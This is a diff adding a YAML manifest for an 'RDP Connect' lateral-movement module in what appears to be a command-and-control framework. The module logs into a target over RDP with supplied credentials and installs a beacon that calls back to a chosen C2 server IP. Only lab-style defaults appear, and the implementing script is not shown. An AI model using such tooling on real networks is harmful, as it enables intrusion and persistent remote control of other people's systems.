@@ -1,0 +1,87 @@
+module:
+  id: rdp_connect
+  version: "1.0.0"
+  display_name: "RDP Connect"
+  description: "Connect to remote host via RDP with stored credentials"
+
+  requires: []
+
+  provides:
+    - RDPConnect
+
+  files:
+    - code.ahk
+
+  dispatch:
+    RDPConnect: RDPConnect
+
+  schema:
+    category_id: lateral_movement
+    category_name: "Lateral Movement"
+    modules:
+      rdp_connect:
+        display_name: "RDP Connection"
+        description: "Connect to a host via RDP and install the beacon"
+        command_template: "execute_module|RDPConnect|{hostname},{username},{password},{server_ip},{domain}"
+        parameters:
+          hostname:
+            type: text
+            display_name: "Hostname/IP"
+            description: "Target hostname or IP address"
+            required: true
+            default: "192.168.124.125"
+            validation:
+              min_length: 1
+              max_length: 256
+          username:
+            type: text
+            display_name: "Username"
+            description: "Username for RDP connection"
+            required: true
+            default: "Administrator"
+            validation:
+              min_length: 1
+              max_length: 64
+          password:
+            type: text
+            display_name: "Password"
+            description: "Password for RDP connection"
+            required: true
+            default: "hunter2"
+            validation:
+              min_length: 1
+              max_length: 128
+          server_ip:
+            type: text
+            display_name: "C2 Server IP"
+            description: "This is the IP you want the new beacon to connect to"
+            required: true
+            default: "192.168.124.22"
+            validation:
+              min_length: 1
+              max_length: 15
+          domain:
+            type: text
+            display_name: "Domain"
+            description: "Domain for authentication (optional)"
+            required: false
+            default: "lab.local"
+            validation:
+              max_length: 64
+        documentation:
+          content: "Connects to a host via RDP and installs the beacon on the target system."
+          examples:
+            - "192.168.1.100 / admin / password / 192.168.1.50 / domain.local"
+        execution:
+          timeout: 600
+          requires_admin: false
+        ui:
+          layout: advanced
+          grouping:
+            - - hostname
+              - username
+              - password
+            - - server_ip
+              - domain
+
+  config_options: {}
